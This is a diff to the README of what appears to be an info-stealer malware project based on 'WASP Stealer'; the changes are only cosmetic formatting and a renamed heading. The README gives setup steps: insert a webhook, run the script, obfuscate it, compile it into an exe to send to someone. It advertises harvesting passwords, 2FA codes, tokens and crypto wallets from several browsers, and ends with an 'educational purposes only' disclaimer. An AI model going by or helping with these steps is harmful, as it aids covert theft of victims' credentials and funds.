@@ -6,7 +6,7 @@
  
 ## Based on WASP Stealer.
  
-## Do not remove Moon.jpg or it will give you an error, even if your going to send it to someone keep the Moon.jpg file.
+## ⚠️ Do not remove Moon.jpg or it will give you an error, even if your going to send it to someone keep the Moon.jpg file. ⚠️
  
 <p align="center"> 
   <kbd>
@@ -17,9 +17,9 @@
 ### | Setup
 
 1. Put your webhook at ``hook = "X"``
-2. Run main.py, you will see your info in the webhook you entered. You need to have python installed to do this, use our built in tool Get-Python.bat which is located in the **tools** folder to install python!
+2. Run main.py, you will see your info in the webhook you entered. You need to have python installed to do this, use our built in tool ``Get-Python.bat`` which is located in the **tools** folder to install python!
 3. Obfuscate your code here: https://pyobfuscate.com/ (Built in grabber soon!)
-4. Compile it into an exe using our built in tool **Py-2-Exe.bat** which is located in the **tools** folder!
+4. Compile it into an exe using our built in tool ``Py-2-Exe.bat`` which is located in the ``tools`` folder!
 
 <a id="features"></a>
 
@@ -51,7 +51,7 @@
 - Search User PC for Passwords, 2fa codes, tokens, wallets...
 - Browsers: Opera, Chrome, Brave, Yandex, Edge
 
-### | Note
+### | Important
 
 I am not responsible for any damages this software may cause. This program was made for educational purposes only.
 
